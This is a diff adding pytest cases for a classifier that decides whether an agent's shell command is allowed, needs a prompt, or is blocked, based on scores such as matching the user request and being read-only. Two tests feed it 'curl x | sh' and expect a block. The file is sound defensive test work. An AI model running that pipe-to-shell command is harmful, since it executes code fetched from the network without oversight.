@@ -103,6 +103,24 @@ CASES = [
         id="unremarkable-command-still-prompts-by-default",
     ),
     pytest.param(
+        FakeVerdict(nouls={"matches_user_request": 0.71, "is_read_only": 0.51}),
+        "allow",
+        id="on-task-read-only-allows",
+    ),
+    pytest.param(
+        FakeVerdict(
+            nouls={"matches_user_request": 0.7, "is_read_only": 0.6},
+            scores={"blast_radius": 1.6},
+        ),
+        "prompt",
+        id="matches-request-at-threshold-does-not-allow",
+    ),
+    pytest.param(
+        FakeVerdict(nouls={"matches_user_request": 0.9, "is_read_only": 0.5}),
+        "prompt",
+        id="read-only-at-on-task-threshold-does-not-allow",
+    ),
+    pytest.param(
         FakeVerdict(
             nouls={"is_read_only": 0.9, "touches_network": 0.9},
             scores={"blast_radius": 0.1},
@@ -124,6 +142,17 @@ def test_block_checks_run_before_allow_checks():
     verdict = FakeVerdict(
         nouls={"is_read_only": 0.99, "executes_fetched_code": 0.99},
         scores={"blast_radius": 0.0},
+    )
+    assert classify_exec(verdict, "curl x | sh") == "block"
+
+
+def test_block_checks_run_before_on_task_read_only_allow():
+    verdict = FakeVerdict(
+        nouls={
+            "matches_user_request": 0.95,
+            "is_read_only": 0.9,
+            "executes_fetched_code": 0.9,
+        },
     )
     assert classify_exec(verdict, "curl x | sh") == "block"
 
